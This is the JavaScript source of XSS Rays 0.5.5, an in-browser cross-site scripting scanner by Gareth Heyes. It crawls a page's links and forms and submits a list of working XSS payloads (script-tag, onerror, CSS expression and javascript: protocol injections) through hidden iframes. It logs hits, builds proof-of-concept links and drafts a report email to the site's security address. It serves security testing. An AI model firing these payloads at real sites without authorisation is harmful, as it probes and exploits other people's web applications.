(function(){			
	/*
	 * XSS Rays
	 * Legal bit:
	 * Do not remove this notice.
	 * Copyright (c) 2009 by Gareth Heyes
	 * Programmed for Microsoft
	 * gareth --at-- businessinfo -dot- co |dot| uk
	 * Version 0.5.5	
	 * 
	 * This license governs use of the accompanying software. If you use the software, you
	 * accept this license. If you do not accept the license, do not use the software.
	 * 1. Definitions
	 * The terms "reproduce," "reproduction," "derivative works," and "distribution" have the
	 * same meaning here as under U.S. copyright law.
	 * A "contribution" is the original software, or any additions or changes to the software.
	 * A "contributor" is any person that distributes its contribution under this license.
	 * "Licensed patents" are a contributor's patent claims that read directly on its contribution.
	 * 2. Grant of Rights
	 * (A) Copyright Grant- Subject to the terms of this license, including the license conditions and limitations in section 3, each contributor grants you a non-exclusive, worldwide, royalty-free copyright license to reproduce its contribution, prepare derivative works of its contribution, and distribute its contribution or any derivative works that you create.
	 * (B) Patent Grant- Subject to the terms of this license, including the license conditions and limitations in section 3, each contributor grants you a non-exclusive, worldwide, royalty-free license under its licensed patents to make, have made, use, sell, offer for sale, import, and/or otherwise dispose of its contribution in the software or derivative works of the contribution in the software.
	 * 3. Conditions and Limitations
	 * (A) No Trademark License- This license does not grant you rights to use any contributors' name, logo, or trademarks.
	 * (B) If you bring a patent claim against any contributor over patents that you claim are infringed by the software, your patent license from such contributor to the software ends automatically.
	 * (C) If you distribute any portion of the software, you must retain all copyright, patent, trademark, and attribution notices that are present in the software.
	 * (D) If you distribute any portion of the software in source code form, you may do so only under this license by including a complete copy of this license with your distribution. If you distribute any portion of the software in compiled or object code form, you may only do so under a license that complies with this license.
	 * (E) The software is licensed "as-is." You bear the risk of using it. The contributors give no express warranties, guarantees or conditions. You may have additional consumer rights under your local laws which this license cannot change. To the extent permitted under your local laws, the contributors exclude the implied warranties of merchantability, fitness for a particular purpose and non-infringement.	 	
	*/
	window.XSS_Rays = function(){};
	window.XSS_Rays.prototype = {
	debug:false,
	sameOrigin: false,
	externalLog: 'http://127.0.0.1/XSS_Rays/logging/xss_logger.php',	
	excludeURLS: /^https?:[\/]{2}somesite\.com/,	
	excludeTypes: /^submit$/i,
	excludeNames: /^someFormFieldName$/,
	errorTimeout:500,	
	cleanUpTimeout:5000,
	completed:0,
	totalConnections:0,
	vectors: [	
										
				  {input:"',XSS,'", name: 'Standard DOM based injection single', browser: 'ALL',url:true,form:true,path:true},
				  {input:'",XSS,"', name: 'Standard DOM based injection double', browser: 'ALL',url:true,form:true,path:true},				  				  
				  {input: '\'><script>XSS<\/script>', name: 'Standard script injection single', browser: 'ALL',url:true,form:true,path:true},				  
				  {input: '"><script>XSS<\/script>', name: 'Standard script injection double', browser: 'ALL',url:true,form:true,path:true},				  				  
				  {input:"' style=abc:expression(XSS) ' \" style=abc:expression(XSS) \"", name: 'Expression CSS based injection', browser: 'IE',url:true,form:true,path:true},										   
				  {input:'" type=image src=null onerror=XSS " \' type=image src=null onerror=XSS \'', name: 'Image input overwrite based injection', browser: 'ALL',url:true,form:true,path:true},										   								  
				  {input:"' onload='XSS' \" onload=\"XSS\"/onload=\"XSS\"/onload='XSS'/", name: 'onload event injection', browser: 'ALL',url:true,form:true,path:true},						  
				  {input:'\'\"<\/script><\/xml><\/title><\/textarea><\/noscript><\/style><\/listing><\/xmp><\/pre><img src=null onerror=XSS>', name: 'Image injection HTML breaker', browser: 'ALL',url:true,form:true,path:true},
				  {input:"'},XSS,function x(){//", name: 'DOM based function breaker single quote', browser: 'ALL',url:true,form:true,path:true},
				  {input:'"},XSS,function x(){//', name: 'DOM based function breaker double quote', browser: 'ALL',url:true,form:true,path:true},			
				  {input:'\\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x3eXSS\\x3c\\x2f\\x73\\x63\\x72\\x69\\x70\\x74\\x3e', name: 'DOM based innerHTML injection', browser: 'ALL',url:true,form:true,path:true},						  						  
  				  {input:'javascript:XSS', name: 'Javascript protocol injection', browser: 'ALL',url:true,form:true,path:true},				  
  				  {input:'null,XSS//', name: 'Unfiltered DOM injection comma', browser: 'ALL',url:true,form:true,path:true},				  
  				  {input:'null\nXSS//', name: 'Unfiltered DOM injection new line', browser: 'ALL',url:true,form:true,path:true}				  				 					
		],
		rowNumber: 0, 		 
		uniqueID: 0,
		rays: [],
		stack: [],
		init: function() {
			var html = '<html><head><style>body {font-size:12px;font-family:Arial;margin:0;padding:0;}';
			html += 'a:link,a:visited {color:#000;}';
			html += 'a:hover {color:#00166E;}';														
			html += 'h1 {font-size:30px;height:50px; letter-spacing:-1px;margin:0;padding:3px;font-family:Arial Black;background-color:#00166E;color:#FFF;}';
			html += 'h1 span {font-family:Arial;font-weight:normal;letter-spacing:1px;}';
			html += 'h2 {font-size:12px;background-color:#000;color:#FFF;margin:0;padding:3px;}';
			html += 'h2 a:link, h2 a:visited {text-decoration:none;color:#FFF;}';
			html += 'h2 a:hover {color:#f6f6f6;}';			
			html += 'table {width:100%;}th {text-align:left;background-color:#f6f6f6;}';
			html += 'tr.row1 {background-color:#fefef1;}';
			html += 'tr.row2 {background-color:#f6f6e8}';
			html += '.button {background-color:#00166E;color:#FFFFFF;float:left;width:100px;}';			
			html += '#logContainer {overflow:auto;width:100%;clear:both;}';
			html += '#linkStatus p, #scanStatus p {margin:0;} #scanStatus, #linkStatus {margin-bottom:1px;background-color:#e3dede; border:1px solid #CCC;padding:3px; width:auto;float:left;}';
			html += '#connectionsStatus p {margin:0;} #connectionsStatus {background-color:#e3dede; border:1px solid #CCC; padding:3px;width:auto;float:left;}';			
			html += '<\/style><\/head><body>';
			html += '<h1>XSS <span>RAYS</span><\/h1>';
			html += '<h2><a href="http://www.businessinfo.co.uk/" target="_blank">By Gareth Heyes</a><\/h2>';
			html += '<input type="button" value="Start Scan" onclick="top.XSS_Rays.scan();top.XSS_Rays.runJobs();" class="button" />';						
			html += '<div id="connectionsStatus"><p>Connections status. Idle.</p></div>';			
			html += '<div id="scanStatus"><p>Scan status. Idle.</p></div>';	
			html += '<div id="linkStatus"><p>Link status. Idle.</p></div>';		
			html += '<div id="logContainer">';
			html += '<table id="log">';
			html += '<thead>';
			html += '<tr>';
			html += '<th>Page<\/th>';
			html += '<th>Vector<\/th>';
			html += '<th>Method<\/th>';
			html += '<th>POC<\/th>';
			html += '<th>Email<\/th>';
			html += '</tr>';
			html += '<\/thead>';			
			html += '<tbody id="logBody"><\/tbody>';							
			html += '</table>';
			html += '<\/div>';									
			html += '<\/body><\/html>';
			var iframe = document.createElement('iframe'); 
			iframe.style.border = '1px solid #CCC';
			iframe.style.width = '99%';
			iframe.style.height = '400px';
			iframe.style.position = 'absolute';
			iframe.style.top = '0px';
			iframe.style.left = '0px';
			iframe.style.backgroundColor = '#FFF';
			iframe.style.zIndex = 1000;
			iframe.id = 'XSS_Rays_logWindow';														
			document.body.appendChild(iframe);		
			iframe.contentWindow.document.write(html);
			iframe.contentWindow.document.close();					
			return this;
		},
		updateLinkStatus:function(statusStr) {
			document.getElementById('XSS_Rays_logWindow').contentWindow.document.getElementById('linkStatus').innerHTML = '<p>'+this.escape(statusStr)+'</p>';
		},		
		updateScanStatus:function(statusStr) {
			document.getElementById('XSS_Rays_logWindow').contentWindow.document.getElementById('scanStatus').innerHTML = '<p>'+this.escape(statusStr)+'</p>';
		},
		updateConnectionsStatus:function(statusStr) {
			document.getElementById('XSS_Rays_logWindow').contentWindow.document.getElementById('connectionsStatus').innerHTML = '<p>'+this.escape(statusStr)+'</p>';
		},		
		isIE:function() {
			return '\v'==='v';			
		},
		complete:function() {
			this.getNextJob();
			this.updateConnectionsStatus(this.completed + ' of ' + this.totalConnections + ' connections completed.');
			if(this.completed == this.totalConnections) {
				this.updateScanStatus('All vectors scanned.');
				this.updateConnectionsStatus('All connections completed.');
				this.updateLinkStatus('All links scanned.');
			}
		},
		getNextJob:function() {
			var that = this;
			if(this.stack.length > 0) {						
				var func = that.stack.shift();
				if (func) {
					that.completed++;
					func.call(that);
				}
			}
		},
		scan:function() {
			this.scanLinks();
			this.scanForms();
		},
		scanPaths:function() {
			this.xss({type:'path'});
			return this;
		},
		scanForms: function() {
			this.xss({type:'form'});
			return this;
		},					
		scanLinks: function() { 					
			for(var i =0;i<document.links.length;i++) {
				var url = document.links[i];
				if(this.excludeURLS.test(url)) {
					continue;
				}
				if((url.hostname.toString() === location.hostname.toString() || this.sameOrigin == false) && (location.protocol === 'http:' || location.protocol === 'https:')) {
					this.xss({href:url.href,pathname:url.pathname,
								  search:url.search, type: 'url'});//scan each link & param								
				} else {
					if (this.debug) {
						console.log('URLS\nurl :' + url.hostname.toString());
						console.log('\nlocation :' + location.hostname.toString());
					}
				}
			}
			if(location.search.length > 0) {
				this.xss({pathname:location.pathname,search:location.search, type: 'url'});//scan originating url		  							
			}
			return this;
		},
		xss:function(target) {							
			switch(target.type) {				
				case "url":
					if(target.search.length > 0) {																																																	
						target.search = target.search.slice(1);
						target.search = target.search.split(/&|&amp;/);
						var params = {};
						for(var i=0;i<target.search.length;i++) {
							target.search[i] = target.search[i].split('=');
							params[target.search[i][0]] = target.search[i][1];
						}
						for(var i=0;i<this.vectors.length;i++) {
							
							if(this.vectors[i].browser == 'IE' && !this.isIE()) {
								continue;
							}
							if(this.vectors[i].browser == 'FF' && this.isIE()) {
								continue;
							}									
							
							if(!this.vectors[i].url) {
								continue;
							}
							if (this.vectors[i].url) {
								this.run(target.href, 'GET', this.vectors[i], params, true);//params							
							}
							if (this.vectors[i].path) {
								this.run(target.href, 'GET', this.vectors[i], null, true);//paths	
							}
						}
					}
				break;
				case "form":							
					var params = {};					
					for(var i=0;i<document.forms.length;i++) {
						var action = document.forms[i].action || self.location;
						var method = document.forms[i].method.toUpperCase() === 'POST' ?
									 'POST' :
									 'GET'; 
						
						if(this.excludeURLS.test(action)) {
							continue;
						}							
						var excludeList = [];															
						for(var j=0;j<document.forms[i].elements.length;j++) {
							if (this.excludeTypes.test(document.forms[i].elements[j].type) || this.excludeNames.test(document.forms[i].elements[j].name)) {
								excludeList.push('^' + document.forms[i].elements[j].name + '$');
							}	
							params[document.forms[i].elements[j].name] = document.forms[i].elements[j].value || 1;
						}
						for (var k = 0; k < this.vectors.length; k++) {	
						
							if(this.vectors[k].browser == 'IE' && !this.isIE()) {
								continue;
							}
							if(this.vectors[k].browser == 'FF' && this.isIE()) {
								continue;
							}																								
							if(!this.vectors[k].form) {
								continue;
							}								
																																																						
							if(this.sameOrigin == true && (this.host(action).toString() != this.host(location.toString()))) {
								if(this.debug) {									
									console.log('FormPost\naction :'+this.host(action).toString());
									console.log('location :'+this.host(location));
								}																
								continue;
							}
							if (this.vectors[k].form) {
								if (method === 'GET') {
									this.run(action, method, this.vectors[k], params, true, excludeList);//params 								
								}
								else {
									this.run(action, method, this.vectors[k], params, false, excludeList);//params
								}
							}
							if (this.vectors[k].path) {
								this.run(action, 'GET', this.vectors[k], null, true, excludeList);//paths														
							}
						}
					}
				break;
			}	
		},
		host: function(url) {
			var host = url;
			host = /^https?:[\/]{2}[^\/]+/.test(url.toString()) 
					? url.toString().match(/^https?:[\/]{2}[^\/]+/) 
					: /(?:^[^a-zA-Z0-9\/]|^[a-zA-Z0-9]+[:]+)/.test(url.toString()) 
						? '' 
						: location.hostname.toString();
			return host;
		},
		fileName: function(url) {
			return url.match(/(?:^[^\/]|^https?:[\/]{2}|^[\/]+)[^?]+/)||'';
		},
		run: function(url, method, vector, params, urlencode, excludeList) {												
			 	this.stack.push(function(){
					if(excludeList) {
						excludeList = new RegExp(excludeList.join('|'),'i');
					} else {
						excludeList = new RegExp();
					}
					var self = this;
					self.uniqueID++;
					self.updateScanStatus('Processing vector: '+vector.name);	
					self.updateLinkStatus('Processing url: '+url);
					var poc = url;
					var exploit = '';
					var logger = 'location=window.name';
					self.rays[self.uniqueID] = {vector:vector,url:url,params:params};																											
					if(params == null) {
						var filename = self.fileName(url);
						exploit = vector.input.replace(/XSS/g,logger);
						url = url.replace(filename,filename+'/'+(urlencode?encodeURIComponent(exploit):exploit) + '/');
						exploit = vector.input.replace(/XSS/g,'alert(1)');
						poc = poc.replace(filename,filename+'/'+(urlencode?encodeURIComponent(exploit):exploit) + '/');
					} else if(method === 'GET') {
						url = self.fileName(url);
						poc = url;
						if(!/[?]/.test(url)) {
							url += '?';
							poc += '?'
						}
						var paramsPos = 0;
						for(var i in params) {
							if(params.hasOwnProperty(i)) {																								
								if(excludeList.test(i)) {
									url += i + '=' + (urlencode?encodeURIComponent(params[i]):params[i]) + '&';
									poc += i + '=' + (urlencode?encodeURIComponent(params[i]):params[i]) + '&';
									continue;
								}
								
								if (paramsPos % 2 == 1 && vector.input2) {
									exploit = vector.input2.replace(/XSS/g, logger);
								} else {
									exploit = vector.input.replace(/XSS/g, logger);
								}								
								url += i + '=' + (urlencode?encodeURIComponent(exploit):exploit) + '&';
								if (paramsPos % 2 == 1 && vector.input2) {
									exploit = vector.input2.replace(/XSS/g, 'alert(1)');
								} else {
									exploit = vector.input.replace(/XSS/g, 'alert(1)');
								}
								poc += i + '=' + (urlencode?encodeURIComponent(exploit):exploit) + '&';
								paramsPos++;
							}
						}									
					}
					var ieLoader = "document.getElementById('"+'ray'+self.uniqueID+"').ieonload()";												
					if(self.isIE()) {
						try {
							var iframe = document.createElement('<iframe name="'+location + '#xss'+'" onload="'+ieLoader+'">');
						} catch (e) {							
							var iframe = document.createElement('iframe');
						}
					} else {
						var iframe = document.createElement('iframe');
					}					
					iframe.style.display = 'none';
					iframe.id = 'ray'+self.uniqueID;
					iframe.time = self.timestamp();					
					iframe.name = location + '#xss';
					iframe.ieonload = iframe.onload = function() {											
						try {
							if(this.contentWindow.location.hash.slice(1) == 'xss') {	
								XSS_Rays.logger(this.id);
								if (document.getElementById(this.id)) {
									XSS_Rays.complete();
									document.body.removeChild(iframe);
									return;
								}
							}
						} catch(e){}
						
						var that = this;
						setTimeout(function(){							
							if (document.getElementById(that.id)) {
								document.body.removeChild(that);
								XSS_Rays.complete();
							}
						},XSS_Rays.errorTimeout)
					}															
										
					if (method === 'GET') {		
						iframe.src = url;
						document.body.appendChild(iframe);
					} else if (method === 'POST') {
						var form = '<form action="'+self.escape(url)+'" method="post" id="frm">';
						poc += '?';
						var paramsPos = 0;
						for(var i in params) {
							if(params.hasOwnProperty(i)) {																															
								if (excludeList.test(i)) {
									form += '<textarea name="' + i + '">' + self.escape(params[i]) + '<\/textarea>';
									continue;
								} else {
								
									if (paramsPos % 2 == 1 && vector.input2) {
										exploit = self.escape(vector.input2.replace(/XSS/g, logger));
									}
									else {
										exploit = self.escape(vector.input.replace(/XSS/g, logger));
									}
									form += '<textarea name="' + i + '">' + exploit + '<\/textarea>';
									if (paramsPos % 2 == 1 && vector.input2) {
										exploit = vector.input2.replace(/XSS/g, 'alert(1)');
									}
									else {
										exploit = vector.input.replace(/XSS/g, 'alert(1)');
									}
									poc += i + '=' + (urlencode ? encodeURIComponent(exploit) : exploit) + '&';
									paramsPos++;
								}
							}
						}										
						form += '<\/form>';
						document.body.appendChild(iframe);																				
						iframe.contentWindow.document.writeln(form);										
						iframe.contentWindow.document.writeln('<script>document.createElement("form").submit.apply(document.forms[0]);<\/script>');
					}
					self.rays[self.uniqueID].vector.poc = poc;
					self.rays[self.uniqueID].vector.method = method;					
				});							
		},
		runJobs: function() {
			var that = this;
			this.totalConnections = this.stack.length;
			that.getNextJob();
			setInterval(function(){
				var numOfConnections = 0;
				for (var i = 0; i < document.getElementsByTagName('iframe').length; i++) {
					var iframe = document.getElementsByTagName('iframe')[i];
					if (iframe.id.match(/^ray/) && iframe.time) {
						numOfConnections++;
						try {
							if (iframe.contentWindow.location.hash.slice(1) == 'xss') {
								XSS_Rays.logger(iframe.id);
								if (iframe) {
									XSS_Rays.complete();
									document.body.removeChild(iframe);
								}
							}
							if (parseInt(XSS_Rays.timestamp()) - parseInt(iframe.time) > 5) {
								if (iframe) {
									XSS_Rays.complete();
									document.body.removeChild(iframe);
								}
							}
							
						} 
						catch (e) {
						}
					}
				}
				
				if(numOfConnections == 0) {
					clearTimeout(this);
				}
				
			}, this.cleanUpTimeout);
						
			return this;
		},
		timestamp: function() {
			return parseInt(new Date().getTime().toString().substring(0, 10));
		},
		logger: function(uniqueID) {
			uniqueID = uniqueID.replace(/[^0-9]+/,'');							
			var ray = this.rays[uniqueID];
			var logWindow = document.getElementById('XSS_Rays_logWindow').contentWindow.document;
			var tableLog = document.getElementById('XSS_Rays_logWindow').contentWindow.document.getElementById('logBody');
			var tr = logWindow.createElement('tr');
			var td = logWindow.createElement('td');
			tr.className = this.rowNumber % 2 === 0 ? 'row1' : 'row2';
			td.innerHTML += '<td>';
			td.innerHTML += this.escape(ray.url.replace(/&/g,'&amp;'));
			td.innerHTML += '<\/td>';
			tr.appendChild(td);
			
			td = logWindow.createElement('td');
			td.innerHTML += '<td>';
			td.innerHTML += this.escape(ray.vector.name);							
			td.innerHTML += '<\/td>';
			tr.appendChild(td);
			
			td = logWindow.createElement('td');
			td.innerHTML += '<td>';
			td.innerHTML += this.escape(ray.vector.method);							
			td.innerHTML += '<\/td>';
			tr.appendChild(td);										 												
			
			td = logWindow.createElement('td');														
			td.innerHTML += '<td>';
			td.innerHTML += '<a href="'+this.escape(ray.vector.poc)+'" target="_blank">POC<\/a>';
			td.innerHTML += '<\/td>';
			tr.appendChild(td);
			
			td = logWindow.createElement('td');
			td.innerHTML += '<td>';
			var mailURL = 'security@' + location.host.replace(/^www\./i,'');
			mailURL += '?subject=';
			mailURL += encodeURIComponent('XSS hole found on:' + location.host);
			mailURL += '&body=';
			mailURL += encodeURIComponent('Hi security team,\n\nIve found a XSS hole on '+ location.host + '. A proof of concept is available here:-\n'+ray.vector.poc+'\n\nCheers');
			td.innerHTML += '<a href="mailto:'+mailURL+'">Email<\/a>';
			td.innerHTML += '<\/td>';
			tr.appendChild(td);		
			
			if(this.externalLog) {
				var logger = new Image();
				logger.src = this.externalLog + '?xss='+encodeURIComponent('Host: '+location.host+'\tPath: '+location.pathname+'\tVector Name:'+ray.vector.name+'\tMethod:' + ray.vector.method + '\tPOC:' + ray.vector.poc);
			}
																														
			tableLog.appendChild(tr);
			this.rowNumber++;
		},						
		escape: function(str) {
			str = str.toString();
			str = str.replace(/</g,'&lt;');
			str = str.replace(/>/g,'&gt;');
			str = str.replace(/\u0022/g,'&quot;');
			str = str.replace(/\u0027/g,'&#39;');
			str = str.replace(/\\/g,'&#92;');
			return str;
		}												
	};									
														
})();
		
XSS_Rays=new XSS_Rays;
XSS_Rays.init();
